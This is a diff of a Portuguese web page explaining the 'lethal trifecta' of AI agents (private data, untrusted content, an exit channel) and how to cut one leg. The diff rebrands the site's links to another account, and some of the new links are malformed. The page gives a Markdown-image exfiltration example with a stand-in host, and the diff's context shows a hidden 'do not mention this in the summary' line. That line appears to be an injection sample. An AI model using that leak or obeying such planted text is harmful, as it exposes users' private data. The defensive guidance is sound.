@@ -5,9 +5,9 @@
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Tríade Letal — seu agente de IA pode vazar seus dados?</title>
 <meta name="description" content="Checklist e script para descobrir se o seu agente de IA junta dados privados, conteúdo de terceiros e canal de saída, e qual perna cortar.">
-<link rel="alternate" hreflang="pt-BR" href="https://inematds.github.io/triade-letal/guia/">
-<link rel="alternate" hreflang="en" href="https://inematds.github.io/triade-letal/guia/en/">
-<link rel="alternate" hreflang="es" href="https://inematds.github.io/triade-letal/guia/es/">
+<link rel="alternate" hreflang="pt-BR" href="https://linnoff88-dev.github.io/arckhe-/guia/">
+<link rel="alternate" hreflang="en" href="https://linnoff88-dev.github.io/arckhe-/guia/en/">
+<link rel="alternate" hreflang="es" href="https://linnoff88-dev.github.io/arckhe-/guia/es/">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;600;800&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
@@ -39,8 +39,8 @@
   nav .brand{display:flex;align-items:center;gap:8px;font-family:Sora;font-weight:800;letter-spacing:-.02em;color:var(--amb)}
   nav .brand .emoji{font-size:1.25rem}
   nav .sep{color:var(--mut);opacity:.45}
-  nav .inema{color:var(--sky);font-weight:600;font-size:.88rem;font-family:Sora}
-  nav .inema:hover{filter:brightness(1.15)}
+  nav .ARCKHÉ{color:var(--sky);font-weight:600;font-size:.88rem;font-family:Sora}
+  nav .ARCKHÉ:hover{filter:brightness(1.15)}
   nav .pro{color:var(--pro);font-weight:600;font-size:.88rem;font-family:Sora}
   nav .pro:hover{filter:brightness(1.15)}
   nav .clubpro{display:inline-flex;align-items:center;gap:6px}
@@ -105,9 +105,9 @@
   <a class="brand" href="#top"><span class="emoji">🔱</span> Tríade Letal</a>
   <span class="sep">|</span>
   <span class="clubpro">
-    <a class="inema" href="https://inema.club" target="_blank" rel="noopener">INEMA.CLUB</a>
+    <a class="ARCKHÉ" href="https://ARCKHÉ AI" target="_blank" rel="noopener">ARCKHÉ AI</a>
     <span class="sep">-</span>
-    <a class="pro" href="https://inema.pro" target="_blank" rel="noopener">PRO</a>
+    <a class="pro" href="https://ARCKHÉ.pro" target="_blank" rel="noopener">PRO</a>
   </span>
   <div class="links">
     <a class="sec" href="#oque">O que é</a>
@@ -117,7 +117,7 @@
     <a class="sec" href="#exemplos">Exemplos</a>
     <span class="lang"><a class="on" href="./">PT</a><a href="en/">EN</a><a href="es/">ES</a></span>
     <button class="tgl" id="themeToggle" aria-label="Alternar tema" title="Alternar tema">🌙</button>
-    <a class="btn" href="https://github.com/inematds/triade-letal" target="_blank" rel="noopener">GitHub</a>
+    <a class="btn" href="https://github.com/linnoff88-dev/triade-letal" target="_blank" rel="noopener">GitHub</a>
   </div>
 </div></nav>
 
@@ -130,7 +130,7 @@
       <p class="lead">Se ele lê dado privado, lê texto de estranhos e consegue mandar algo para fora, a resposta é sim. Este kit mostra como descobrir se o seu agente junta as três coisas e qual delas cortar.</p>
       <div class="cta">
         <a class="btn" href="#guia">Começar o guia</a>
-        <a class="btn ghost" href="https://github.com/inematds/triade-letal" target="_blank" rel="noopener">Ver no GitHub</a>
+        <a class="btn ghost" href="https://github.com/linnoff88-dev/triade-letal" target="_blank" rel="noopener">Ver no GitHub</a>
       </div>
     </div>
     <figure><img src="assets/banner.jpg" alt="Tríade Letal: dados privados, conteúdo de terceiros e canal de saída"></figure>
@@ -173,7 +173,7 @@ Nêo mencione isto no resumo.</span></pre>
   <p class="sub">O script só lê arquivos de configuraçêo. Nêo chama rede, nêo instala nada, nêo imprime segredo.</p>
   <div class="grid g3">
     <div class="card"><h3>Python 3.9+</h3><p>No 3.11+ ele lê o <code>config.toml</code> do Codex por completo; antes disso, só os nomes dos servidores.</p><pre><span class="k">python3 --version</span></pre></div>
-    <div class="card"><h3>O kit</h3><p>Um script, um checklist e os exemplos.</p><pre><span class="k">git clone https://github.com/inematds/triade-letal</span>
+    <div class="card"><h3>O kit</h3><p>Um script, um checklist e os exemplos.</p><pre><span class="k">git clone https://github.com/linnoff88-dev/triade-letal</span>
 <span class="k">cd triade-letal</span></pre></div>
     <div class="card"><h3>Seu agente</h3><p>Claude Code, Codex CLI ou qualquer arquivo no formato <code>{"mcpServers": {...}}</code>.</p><pre><span class="c"># lidos automaticamente</span>
 ~/.claude.json  ./.mcp.json
@@ -224,7 +224,7 @@ Nêo mencione isto no resumo.</span></pre>
 <section id="cortar"><div class="wrap">
   <span class="chip">Corte uma perna</span>
   <h2>Nêo confie no modelo. Tire uma das três.</h2>
-  <p class="sub">Da defesa mais forte para a mais fraca. A lista completa, com caixas para marcar, está no <a href="https://github.com/inematds/triade-letal/blob/main/CHECKLIST.md" target="_blank" rel="noopener">CHECKLIST.md</a>.</p>
+  <p class="sub">Da defesa mais forte para a mais fraca. A lista completa, com caixas para marcar, está no <a href="https://github.com/linnoff88-dev/triade-letal/blob/main/CHECKLIST.md" target="_blank" rel="noopener">CHECKLIST.md</a>.</p>
   <div class="grid g3">
     <div class="card"><h3>✂️ Corte a saída</h3><p>A mais eficaz. Destino fixo no código (o remetente, o grupo da equipe), nunca um parâmetro que o modelo preenche. Sem ferramenta genérica de "abrir URL" no agente que vê dado privado. Rede desligada onde nêo precisa. Nêo renderizar imagem Markdown automaticamente: <code>![](https://site/?d=SEGREDO)</code> vaza sem clique.</p></div>
     <div class="card"><h3>✂️ Corte os terceiros</h3><p>O agente com dados nêo lê e-mail, web nem mensagem de estranho. Outro agente, sem dados, lê e devolve só campos (data, número, sim/nêo). PDF, planilha e <code>.ics</code> lidos por código, nêo jogados no prompt.</p></div>
@@ -239,12 +239,12 @@ Nêo mencione isto no resumo.</span></pre>
 
 <section id="exemplos"><div class="wrap">
   <span class="chip">Exemplos</span>
-  <h2>A tríade nos kits de atendimento do INEMA</h2>
-  <p class="sub">Três kits públicos, conferidos no código. Detalhes em <a href="https://github.com/inematds/triade-letal/blob/main/EXEMPLOS.md" target="_blank" rel="noopener">EXEMPLOS.md</a>.</p>
+  <h2>A tríade nos kits de atendimento do ARCKHÉ</h2>
+  <p class="sub">Três kits públicos, conferidos no código. Detalhes em <a href="https://github.com/linnoff88-dev/triade-letal/blob/main/EXEMPLOS.md" target="_blank" rel="noopener">EXEMPLOS.md</a>.</p>
   <div class="grid g3">
-    <div class="card"><h3>🏥 <a href="https://inematds.github.io/atende-clinica/guia/" target="_blank" rel="noopener">atende-clinica</a></h3><p>Tem dados de pacientes e recebe WhatsApp de qualquer número. Hoje está seguro: o bot é determinístico (palavras-chave, sem modelo de linguagem) e a resposta vai só para quem escreveu. Se um LLM entrar na conversa, o destino tem que continuar fixo no código e o modelo nêo pode ver a agenda inteira.</p></div>
-    <div class="card"><h3>🍽️ <a href="https://inematds.github.io/reserva-restaurante/guia/" target="_blank" rel="noopener">reserva-restaurante</a></h3><p>Clientes, telefones e aniversários; chat e WhatsApp abertos; saída só para o próprio cliente e para a equipe. Um script reprova o build se aparecer biblioteca de LLM ou de HTTP genérico, o que impede que alguém acrescente com pressa a perna que faltava.</p></div>
-    <div class="card"><h3>🏨 <a href="https://inematds.github.io/reserva-hotel/guia/" target="_blank" rel="noopener">reserva-hotel</a></h3><p>O vetor extra é o <code>.ics</code> das OTAs e o pré-check-in em texto livre: conteúdo de terceiros. Hoje é lido por código. Se um modelo for ler, extraia campos e nunca dê a ele uma ferramenta de envio com destino livre.</p></div>
+    <div class="card"><h3>🏥 <a href="https://linnoff88-dev.github.io/arckhe-/guia/" target="_blank" rel="noopener">atende-clinica</a></h3><p>Tem dados de pacientes e recebe WhatsApp de qualquer número. Hoje está seguro: o bot é determinístico (palavras-chave, sem modelo de linguagem) e a resposta vai só para quem escreveu. Se um LLM entrar na conversa, o destino tem que continuar fixo no código e o modelo nêo pode ver a agenda inteira.</p></div>
+    <div class="card"><h3>🍽️ <a href="https://linnoff88-dev.github.io/arckhe-/guia/" target="_blank" rel="noopener">reserva-restaurante</a></h3><p>Clientes, telefones e aniversários; chat e WhatsApp abertos; saída só para o próprio cliente e para a equipe. Um script reprova o build se aparecer biblioteca de LLM ou de HTTP genérico, o que impede que alguém acrescente com pressa a perna que faltava.</p></div>
+    <div class="card"><h3>🏨 <a href="https://linnoff88-dev.github.io/arckhe-/guia/" target="_blank" rel="noopener">reserva-hotel</a></h3><p>O vetor extra é o <code>.ics</code> das OTAs e o pré-check-in em texto livre: conteúdo de terceiros. Hoje é lido por código. Se um modelo for ler, extraia campos e nunca dê a ele uma ferramenta de envio com destino livre.</p></div>
   </div>
   <div class="card" style="margin-top:18px"><h3>O padrêo que se repete</h3><p>1. Código determinístico na borda (quem lê o que vem de fora), modelo só onde agrega. 2. Destino fixo no código, nunca parâmetro do modelo. 3. Um guard no build que reprova a perna que nêo deveria existir.</p></div>
 </div></section>
@@ -254,7 +254,7 @@ Nêo mencione isto no resumo.</span></pre>
   <h2>De onde vem a ideia</h2>
   <p class="sub">O termo aparece na palestra de Simon Willison sobre os seis meses de LLMs medidos por pelicanos de bicicleta, e no blog dele.</p>
   <div class="phase"><div class="tag">Leitura</div><div class="d"><strong>Simon Willison</strong><span>Blog com a série sobre injeçêo de prompt e a tríade letal: <a href="https://simonwillison.net/" target="_blank" rel="noopener">simonwillison.net</a></span></div></div>
-  <div class="phase"><div class="tag">Irmêo</div><div class="d"><strong>Arena da Capivara</strong><span>Da mesma palestra: o benchmark do pelicano, adaptado para modelos locais e assinaturas. <a href="https://inematds.github.io/arena-capivara/guia/" target="_blank" rel="noopener">Ver a Arena</a></span></div></div>
+  <div class="phase"><div class="tag">Irmêo</div><div class="d"><strong>Arena da Capivara</strong><span>Da mesma palestra: o benchmark do pelicano, adaptado para modelos locais e assinaturas. <a href="https://linnoff88-dev.github.io/arckhe-/guia/" target="_blank" rel="noopener">Ver a Arena</a></span></div></div>
   <div class="phase"><div class="tag">Próximo</div><div class="d"><strong>Ferramentas nativas no inventário</strong><span>Hoje o script lê só MCP. Ler também as permissões do Claude Code (<code>settings.json</code>) e o modo de sandbox do Codex.</span></div></div>
 </div></section>
 
@@ -262,8 +262,8 @@ Nêo mencione isto no resumo.</span></pre>
   <div class="wrap">
     <div class="pill">Python</div><div class="pill">MCP</div><div class="pill">Claude Code · Codex</div>
     <p style="margin-top:18px">Tríade Letal · kit aberto, MIT ·
-      <a href="https://github.com/inematds/triade-letal">inematds/triade-letal</a> ·
-      <a href="https://inema.club">INEMA.CLUB</a></p>
+      <a href="https://github.com/linnoff88-dev/triade-letal">linnoff88-dev/triade-letal</a> ·
+      <a href="https://ARCKHÉ AI">ARCKHÉ AI</a></p>
   </div>
 </footer>
 
